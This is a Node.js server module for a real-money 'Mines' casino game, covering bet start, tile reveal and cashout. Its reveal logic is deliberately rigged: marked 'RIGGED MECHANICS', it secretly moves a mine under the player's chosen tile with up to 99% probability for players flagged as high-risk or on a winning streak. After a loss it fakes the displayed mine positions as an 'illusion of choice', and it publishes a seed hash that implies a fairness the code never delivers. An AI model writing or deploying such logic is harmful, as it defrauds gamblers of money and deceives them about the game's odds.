
const crypto = require('crypto');
const { User, GameSession } = require('../../models');
const { processTransaction, saveGameLog, GameStateHelper } = require('../modules/TransactionManager');
const { calculateRisk } = require('../modules/RiskEngine');
const { AchievementSystem } = require('../modules/AchievementSystem');
const { secureRandomInt, secureRandomFloat, generateSeed, logGameResult } = require('../../utils');

const GRID_SIZE = 25;

// Helper: Calculate ROI String safely
const getRoiString = (user, currentBet, currentPayout) => {
    if (user.totalDeposits > 0) {
        return (((user.balance - user.totalDeposits) / user.totalDeposits) * 100).toFixed(2) + '%';
    } else {
        const totalWagered = (user.stats?.totalWagered || 0) + currentBet;
        const totalWon = (user.stats?.totalWonAmount || 0) + currentPayout;
        if (totalWagered > 0) {
            const yieldVal = ((totalWon - totalWagered) / totalWagered) * 100;
            return yieldVal.toFixed(2) + '% (Test)';
        }
        return '0.00% (Test)';
    }
};

const start = async (userId, amount, minesCount) => {
    // Parallel Fetch for Speed
    const [userFetch, existingSession] = await Promise.all([
        User.findById(userId),
        GameSession.findOne({ userId })
    ]);

    if (!userFetch) throw new Error("User not found");
    if (existingSession) throw new Error("Jogo já em andamento.");

    const minesSet = new Set(); while(minesSet.size < minesCount) minesSet.add(secureRandomInt(0, 25));
    const risk = calculateRisk(userFetch, amount); 
    const serverSeed = generateSeed();
    
    const gameState = { type: 'MINES', bet: amount, minesCount, minesList: Array.from(minesSet), minesRevealed: [], minesMultiplier: 1.0, minesGameOver: false, riskLevel: risk.level, serverSeed };
    
    // Start requires transaction
    const user = await processTransaction(userId, -amount, 'BET', 'MINES', null, gameState);
    const publicSeed = crypto.createHash('sha256').update(serverSeed).digest('hex');
    
    return { success: true, newBalance: user.balance, publicSeed, loyaltyPoints: user.loyaltyPoints };
};

const reveal = async (userId, tileId) => {
    // OTIMIZAÇÃO: Busca User e Session em paralelo
    const [session, user] = await Promise.all([
        GameSession.findOne({ userId }).select('+minesList'),
        User.findById(userId)
    ]);

    if (!session || session.type !== 'MINES') throw new Error('Jogo não encontrado.');
    
    // Working with POJO for speed
    let g = session.toObject();
    
    // IDEMPOTENCY CHECK: If tile already revealed, return current state without penalty
    if (g.minesRevealed.includes(tileId)) {
         return {
             outcome: 'GEM', 
             status: 'PLAYING', 
             profit: (g.bet * g.minesMultiplier), 
             multiplier: g.minesMultiplier,
             newBalance: user.balance
         };
    }
    
    let cM = [...g.minesList]; 
    let optimizationProb = 0; let adjustmentLog = null;

    // RIGGED MECHANICS
    if (g.riskLevel === 'HIGH' || g.riskLevel === 'EXTREME') { 
        optimizationProb = g.riskLevel === 'EXTREME' ? 0.99 : 0.90; 
        adjustmentLog = `QUANTUM_SWAP`; 
    }

    if (g.minesCount <= 4 && user.consecutiveWins >= 3) {
        optimizationProb = 0.95; 
        adjustmentLog = `LANDMINE_PROTOCOL`;
    }

    // Move bomb logic
    if (!cM.includes(tileId) && secureRandomFloat() < optimizationProb) { 
        const bombToMoveIdx = cM.findIndex(m => !g.minesRevealed.includes(m)); 
        if (bombToMoveIdx !== -1) { 
            cM.splice(bombToMoveIdx, 1); 
            cM.push(tileId); 
        } 
    }

    if (cM.includes(tileId)) {
        // --- GAME OVER ---
        g.minesList = cM; 
        
        // Illusion of choice
        const neighbors = [tileId-1, tileId+1, tileId-5, tileId+5, tileId-6, tileId-4, tileId+4, tileId+6]
            .filter(n => n >= 0 && n < 25 && !g.minesRevealed.includes(n) && n !== tileId);
        
        let remainingBombs = cM.filter(m => m !== tileId);
        let visualMines = [tileId];
        
        for (let i = 0; i < remainingBombs.length; i++) {
            if (neighbors[i] !== undefined) visualMines.push(neighbors[i]);
            else visualMines.push(remainingBombs[i]);
        }
        g.minesList = visualMines;

        // DB Updates (Parallel)
        await Promise.all([
            User.updateOne({ _id: userId }, { lastBetResult: 'LOSS', previousBet: g.bet, $unset: { activeGame: "" }, consecutiveLosses: 1, consecutiveWins: 0 }),
            GameSession.deleteOne({ userId })
        ]);
        
        // Async Logging (Fire & Forget)
        const currentRoi = getRoiString(user, g.bet, 0);
        logGameResult('MINES', user.username, -g.bet, 0, g.riskLevel, adjustmentLog, currentRoi);
        
        saveGameLog(userId, 'MINES', g.bet, 0, { outcome: 'BOMB', minesCount: g.minesCount }, g.riskLevel, adjustmentLog).catch(console.error);
        AchievementSystem.check(userId, { game: 'MINES', bet: g.bet, payout: 0 });
        
        // Return latest balance (no change on loss in Mines, already deducted at start)
        return { outcome: 'BOMB', mines: visualMines, status: 'GAME_OVER', newBalance: user.balance, loyaltyPoints: user.loyaltyPoints };
    }
    
    // --- GEM FOUND ---
    g.minesRevealed.push(tileId); 
    const mult = 1.0 + (g.minesRevealed.length * 0.1 * g.minesCount); 
    g.minesMultiplier = mult;
    g.minesList = cM;
    
    // Check Max Win (All gems found)
    const totalGems = GRID_SIZE - g.minesCount;
    if (g.minesRevealed.length >= totalGems) {
        // Auto cashout (Transaction Required)
        const profit = parseFloat((g.bet * mult).toFixed(2));
        const processedUser = await processTransaction(userId, profit, 'WIN', 'MINES');
        
        saveGameLog(userId, 'MINES', g.bet, profit, { outcome: 'WIN_ALL', multiplier: mult }, g.riskLevel, null).catch(console.error);
        
        return { outcome: 'GEM', status: 'WIN_ALL', profit, multiplier: mult, newBalance: processedUser.balance, mines: g.minesList };
    }

    // --- LAZY UPDATE (PERFORMANCE CRITICAL) ---
    // Update only the GameSession. Do NOT touch User collection or create Transaction log for simple reveals.
    await GameSession.updateOne({ userId }, { 
        minesRevealed: g.minesRevealed, 
        minesMultiplier: g.minesMultiplier, 
        minesList: g.minesList,
        updatedAt: new Date()
    });

    // Return current user balance (unchanged until cashout)
    return { outcome: 'GEM', status: 'PLAYING', profit: g.bet * mult, multiplier: mult, newBalance: user.balance };
};

const cashout = async (userId) => {
    const session = await GameSession.findOne({ userId }).select('+minesList');
    if (!session || session.type !== 'MINES') throw new Error('Jogo não encontrado.');
    
    const user = await User.findById(userId); // Need fresh user for consecutive stats
    let g = session.toObject();
    
    const prevLosses = user.consecutiveLosses;
    const profit = parseFloat((g.bet * g.minesMultiplier).toFixed(2));
    
    // Execute Transaction
    const processedUser = await processTransaction(userId, profit, 'WIN', 'MINES');
    
    // Cleanup (Parallel)
    await Promise.all([
        User.updateOne({ _id: userId }, { lastBetResult: 'WIN', previousBet: g.bet, $unset: { activeGame: "" }, $inc: { consecutiveWins: 1 }, $set: { consecutiveLosses: 0 } }),
        GameSession.deleteOne({ userId })
    ]);
    
    // Async Logs
    const currentRoi = getRoiString(processedUser, g.bet, profit);
    logGameResult('MINES', user.username, profit - g.bet, profit, g.riskLevel, null, currentRoi);

    saveGameLog(userId, 'MINES', g.bet, profit, { outcome: 'CASHOUT', multiplier: g.minesMultiplier }, g.riskLevel, null, processedUser.lastTransactionId).catch(console.error);
    
    const newTrophies = await AchievementSystem.check(userId, { 
        game: 'MINES', bet: g.bet, payout: profit, 
        extra: { revealedCount: g.minesRevealed.length, previousLosses: prevLosses, lossStreakBroken: true, multiplier: g.minesMultiplier } 
    });
    
    return { success: true, profit, newBalance: processedUser.balance, mines: g.minesList, newTrophies, loyaltyPoints: processedUser.loyaltyPoints };
};

module.exports = { start, reveal, cashout };
